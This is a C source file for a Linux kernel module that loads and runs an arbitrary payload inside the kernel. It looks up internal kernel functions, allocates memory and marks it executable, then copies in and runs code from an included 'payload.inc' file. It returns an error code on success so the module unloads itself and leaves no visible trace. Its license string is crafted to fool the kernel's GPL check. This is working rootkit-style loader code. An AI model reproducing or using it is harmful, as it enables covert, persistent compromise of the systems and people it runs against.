#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <net/net_namespace.h>

#include "payload.inc"

static long lookupName = 0;
module_param(lookupName, long, 0);

extern __attribute__((weak)) unsigned long kallsyms_lookup_name(const char *);

unsigned long lookup_name(const char *name) {
	static typeof(lookup_name) *lookup = (void *)kallsyms_lookup_name;
	if (NULL == lookup)
		lookup = (void *)lookupName;
	return lookup ? lookup(name) : 0;
}

int init_module(void) {
	void *mem = NULL;
	void *(*malloc)(long size) = NULL;
	int   (*set_memory_x)(unsigned long, int) = NULL;

	malloc = (void *)lookup_name("module_alloc");
	if (!malloc) {
		pr_debug("module_alloc() not found\n");
		goto Error;
	}

	mem = malloc(round_up(payload_len, PAGE_SIZE));
	if (!mem) {
		pr_debug("malloc(payload_len) failed\n");
		goto Error;
	}

	set_memory_x = (void *)lookup_name("set_memory_x");
	if (set_memory_x) {
		int numpages = round_up(payload_len, PAGE_SIZE) / PAGE_SIZE;
		set_memory_x((unsigned long)mem, numpages);
	}

	print_hex_dump_bytes("payload@", DUMP_PREFIX_OFFSET, payload, payload_len);

	memcpy(mem, payload, payload_len);
	if (0 == ((long (*)(void *, void *))mem)(lookup_name, &init_net))
		return -ENOTTY; // success

Error:
	if (mem) vfree(mem);
	return -EINVAL; // failure
}

MODULE_LICENSE("GPL\0But who really cares?");
